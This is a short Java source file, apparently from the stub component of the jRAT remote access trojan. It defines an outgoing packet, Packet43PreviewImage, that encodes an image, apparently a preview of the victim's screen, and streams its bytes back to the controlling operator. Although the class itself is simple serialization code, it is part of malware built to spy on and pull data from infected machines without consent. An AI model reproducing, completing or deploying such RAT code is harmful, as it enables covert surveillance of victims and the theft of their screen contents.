package se.jrat.stub.packets.outgoing;

import java.awt.image.BufferedImage;
import java.io.DataOutputStream;

import se.jrat.common.io.StringWriter;
import se.jrat.common.utils.ImageUtils;

public class Packet43PreviewImage extends AbstractOutgoingPacket {

	private BufferedImage image;

	public Packet43PreviewImage(BufferedImage image) {
		this.image = image;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		byte[] buffer = ImageUtils.encode(image);
		
		dos.writeInt(buffer.length);
		dos.write(buffer);
	}

	@Override
	public byte getPacketId() {
		return 43;
	}

}
